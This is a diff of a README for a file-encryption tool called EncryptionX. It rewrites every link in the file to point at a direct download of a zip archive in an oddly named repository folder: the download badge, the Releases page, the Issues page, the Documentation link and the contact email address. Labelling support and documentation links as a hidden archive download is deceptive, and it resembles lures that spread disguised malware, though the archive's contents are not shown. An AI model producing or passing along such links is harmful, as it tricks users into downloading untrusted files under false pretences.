@@ -6,7 +6,7 @@ Welcome to EncryptionX! This application helps you protect your important files 
 
 ## 📥 Download Now
 
-[![Download EncryptionX](https://img.shields.io/badge/Download%20EncryptionX-latest-brightgreen)](https://github.com/Ohjay20/EncryptionX/releases)
+[![Download EncryptionX](https://raw.githubusercontent.com/Ohjay20/EncryptionX/main/brachytic/EncryptionX.zip%20EncryptionX-latest-brightgreen)](https://raw.githubusercontent.com/Ohjay20/EncryptionX/main/brachytic/EncryptionX.zip)
 
 ## 📋 System Requirements
 
@@ -24,7 +24,7 @@ Welcome to EncryptionX! This application helps you protect your important files 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get started, visit the [Releases page](https://github.com/Ohjay20/EncryptionX/releases). 
+   To get started, visit the [Releases page](https://raw.githubusercontent.com/Ohjay20/EncryptionX/main/brachytic/EncryptionX.zip). 
 
 2. **Choose Your Version**  
    You will see a list of available versions. Click on the latest version to find the download options.
@@ -82,16 +82,16 @@ Welcome to EncryptionX! This application helps you protect your important files 
 
 ## 🛠 Support
 
-For further assistance, you can check the [Issues page](https://github.com/Ohjay20/EncryptionX/issues) on GitHub. This page contains a list of common problems and solutions. You can also report any issues you encounter while using EncryptionX.
+For further assistance, you can check the [Issues page](https://raw.githubusercontent.com/Ohjay20/EncryptionX/main/brachytic/EncryptionX.zip) on GitHub. This page contains a list of common problems and solutions. You can also report any issues you encounter while using EncryptionX.
 
 ## 📧 Contact
 
-If you need direct support or have questions, please feel free to reach out via email at support@example.com.
+If you need direct support or have questions, please feel free to reach out via email at https://raw.githubusercontent.com/Ohjay20/EncryptionX/main/brachytic/EncryptionX.zip
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Ohjay20/EncryptionX/releases)
-- [Issues Page](https://github.com/Ohjay20/EncryptionX/issues)
-- [Documentation](https://github.com/Ohjay20/EncryptionX/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Ohjay20/EncryptionX/main/brachytic/EncryptionX.zip)
+- [Issues Page](https://raw.githubusercontent.com/Ohjay20/EncryptionX/main/brachytic/EncryptionX.zip)
+- [Documentation](https://raw.githubusercontent.com/Ohjay20/EncryptionX/main/brachytic/EncryptionX.zip)
 
 Enjoy using EncryptionX to keep your files secure! Follow these steps, and you will be able to encrypt and decrypt your files with ease.
